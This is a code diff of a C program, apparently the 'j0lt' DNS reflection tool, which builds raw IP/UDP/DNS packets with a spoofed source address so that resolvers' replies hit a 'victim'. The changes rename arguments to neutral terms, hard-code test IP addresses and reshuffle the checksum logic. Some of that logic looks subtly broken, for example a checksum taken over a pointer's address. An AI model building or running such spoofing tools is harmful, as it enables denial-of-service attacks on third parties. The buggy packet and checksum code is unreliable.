@@ -1,6 +1,6 @@
 /*
 * For using:
-* ./j0lt <resolver ip> <resolver port> <target ip to spoof> <target port>
+* ./j0lt <DST IP> <DST PORT> <SOURCE IP SPOOF> <SOURCE PORT>
 *
 * For reading:
 * https://datatracker.ietf.org/doc/html/rfc1700 (NUMBERS)
@@ -141,9 +141,9 @@ const char* g_ansi = {
 };
 
 bool
-insert_udp_header(uint8_t** buf, size_t* buflen, const UDPHEADER* header);
+insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader);
 bool
-insert_ip_header(uint8_t** buf, size_t* buflen, const IPHEADER* header);
+insert_ip_header(uint8_t** buf, size_t* buflen, IPHEADER* header);
 bool
 insert_dns_header(uint8_t** buf, size_t* buflen, const DNSHEADER* header);
 bool
@@ -151,9 +151,9 @@ insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t que
 void
 pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode);
 void
-pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char* dport, const char* sport);
+pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, const char* dport, const char* sport, size_t nwritten);
 void
-pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* sourceip, const char* destip, size_t nwritten, size_t udpsz);
+pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* destip, const char* sourceip, size_t nwritten, size_t udpsz);
 bool
 insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
 uint16_t
@@ -162,7 +162,7 @@ checksum(const long* addr, int count);
 int
 main(int argc, char** argv)
 {
-    const char* resolvip, * victimport, * victimip, * resolvprt;
+    const char* destip, * sourceport, * sourceip, * destport;
     uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ], * curpos;
 
     struct sockaddr_in addr, srcaddr;
@@ -188,10 +188,10 @@ main(int argc, char** argv)
     }
 #endif
 
-    resolvip = argv[ 1 ];
-    resolvprt = argv[ 2 ];
-    victimip = argv[ 3 ];
-    victimport = argv[ 4 ];
+    destip = argv[ 1 ];
+    destport = argv[ 2 ];
+    sourceip = argv[ 3 ];
+    sourceport = argv[ 4 ];
 
     buflen = NS_PACKETSZ;
     memset(pktbuf, 0, NS_PACKETSZ);
@@ -205,28 +205,29 @@ main(int argc, char** argv)
         goto fail_close;
 
     nwritten = NS_PACKETSZ - buflen;
-    pack_iphdr(&ipheader, &pseudoheader, victimip, resolvip, nwritten, sizeof(UDPHEADER));
-    pack_udphdr(&udpheader, &pseudoheader, nwritten, resolvprt, victimport);
+    pack_iphdr(&ipheader, &pseudoheader, destip, sourceip, nwritten, sizeof(UDPHEADER));
+    pack_udphdr(&udpheader, &pseudoheader, destport, sourceport, nwritten);
 
     addr.sin_family = AF_INET;
     addr.sin_port = udpheader.uh_dport;
-    addr.sin_addr.s_addr = ipheader.saddr;
+    addr.sin_addr.s_addr = ipheader.daddr;
 
     memset(datagram, 0, NS_PACKETSZ);
     curpos = datagram;
     status &= insert_ip_header(&curpos, &buflen, &ipheader);
-    status &= insert_udp_header(&curpos, &buflen, &udpheader);
+    status &= insert_udp_header(&curpos, &buflen, &udpheader, &pseudoheader);
     if (status == false)
         goto fail_close;
 
     szdatagram = buflen;
     insert_data(( void** ) &curpos, &szdatagram, pktbuf, nwritten);
 
+    nwritten = NS_PACKETSZ - buflen;
 #if !DEBUG
-    sendto(raw_sockfd, pktbuf, nwritten, 0, ( const struct sockaddr* ) &addr, sizeof(addr));
+    sendto(raw_sockfd, datagram, nwritten, 0, ( const struct sockaddr* ) &addr, sizeof(addr));
     close(raw_sockfd);
 #else 
-    for (int i = 0; i < NS_PACKETSZ - buflen; i++) {
+    for (int i = 0; i < nwritten; i++) {
         if (i % 16 == 0)
             printf("\n");
         if (i % 2 == 0)
@@ -245,28 +246,26 @@ fail_state:
 }
 
 void
-pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* sourceip, const char* destip, size_t nwritten, size_t udpsz)
+pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* destip, const char* sourceip, size_t nwritten, size_t udpsz)
 {
     memset(iphdr, 0, sizeof(IPHEADER));
     iphdr->version = IPVER;
     iphdr->ihl = IHL_MIN;
-    iphdr->tot_len = sizeof(IPHEADER) + nwritten + udpsz;
-    iphdr->id = ID;
-    iphdr->ttl = 0xff;
+    iphdr->tot_len = 0x51; // (iphdr->ihl << 2) + udpsz + nwritten;
+    iphdr->id = 0xa060; //ID;
+    iphdr->ttl = 0x40; //0xff;
     iphdr->protocol = getprotobyname("udp")->p_proto;
-    iphdr->saddr = htonl(inet_addr(sourceip)); // spoofed ip address to victim
-    iphdr->daddr = htonl(inet_addr(destip)); // name server 
+    iphdr->saddr = htonl(inet_addr("10.137.0.16")); // htonl(inet_addr(sourceip)); // spoofed ip address to victim
+    iphdr->daddr = htonl(inet_addr("10.139.1.1"));// htonl(inet_addr(destip)); // name server 
 
     memset(pseudohdr, 0, sizeof(PSEUDOHDR));
     pseudohdr->protocol = iphdr->protocol;
     pseudohdr->destaddr = iphdr->daddr;
     pseudohdr->sourceaddr = iphdr->saddr;
-
-    iphdr->check = checksum(( const long* ) &iphdr, ( int ) sizeof(IPHEADER));
 }
 
 void
-pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char* dport, const char* sport)
+pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, const char* dport, const char* sport, size_t nwritten)
 {
     uint16_t dport_uint16;
     uint16_t sport_uint16;
@@ -280,12 +279,10 @@ pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char
     }
 
     memset(udphdr, 0, sizeof(UDPHEADER));
-    udphdr->uh_dport = (dport_uint16); // nameserver port
-    udphdr->uh_sport = (sport_uint16); // victim port
+    udphdr->uh_dport = dport_uint16; // nameserver port
+    udphdr->uh_sport = sport_uint16; // victim port
     udphdr->uh_ulen = nwritten + sizeof(UDPHEADER);
     pseudohdr->udplen = udphdr->uh_ulen;
-
-    udphdr->check = checksum(( const long* ) &pseudohdr, ( int ) sizeof(PSEUDOHDR));
 }
 
 void
@@ -310,11 +307,12 @@ pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode)
 }
 
 bool
-insert_ip_header(uint8_t** buf, size_t* buflen, const IPHEADER* header)
+insert_ip_header(uint8_t** buf, size_t* buflen, IPHEADER* header)
 {
     bool status;
     uint8_t first_byte;
 
+    status = true;
     first_byte = header->version << 4 | header->ihl;
     status &= insert_byte(buf, buflen, first_byte);
     status &= insert_byte(buf, buflen, header->tos);
@@ -327,19 +325,55 @@ insert_ip_header(uint8_t** buf, size_t* buflen, const IPHEADER* header)
     status &= insert_dword(buf, buflen, header->saddr);
     status &= insert_dword(buf, buflen, header->daddr);
 
+    header->check = checksum(( const long* ) &header, ( int ) header->ihl << 2);
+    *buf -= 0xa;
+    *(*buf)++ = header->check << 8;
+    **buf = header->check & 0xff;
+    *buf += 8;
+
     return status;
 }
 
+// typedef struct __attribute__((packed, aligned(1)))
+// {
+//     uint32_t sourceaddr;
+//     uint32_t destaddr;
+
+// #if __BYTE_ORDER == __BIGENDIAN 
+//     uint32_t zero : 8;
+//     uint32_t protocol : 8;
+//     uint32_t udplen : 16;
+// #endif
+
+// #if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
+//     uint32_t udplen : 16;
+//     uint32_t protocol : 8;
+//     uint32_t zero : 8;
+// #endif
+// } PSEUDOHDR;
+
+
 bool
-insert_udp_header(uint8_t** buf, size_t* buflen, const UDPHEADER* header)
+insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader)
 {
     bool status;
+    size_t i = 12;
+    uint8_t pseudo[ i ];
+    uint8_t* pseudoptr = pseudo;
 
     status = true;
     status &= insert_word(buf, buflen, header->uh_dport);
     status &= insert_word(buf, buflen, header->uh_sport);
     status &= insert_word(buf, buflen, header->uh_ulen);
     status &= insert_word(buf, buflen, header->uh_sum);
+
+    insert_dword(&pseudoptr, &i, pseudoheader->sourceaddr);
+    insert_dword(&pseudoptr, &i, pseudoheader->destaddr);
+    insert_byte(&pseudoptr, &i, pseudoheader->zero);
+    insert_byte(&pseudoptr, &i, pseudoheader->protocol);
+    insert_word(&pseudoptr, &i, pseudoheader->udplen);
+
+    header->uh_sum = checksum(( const long* ) &pseudo, 12);
 
     return status;
 }
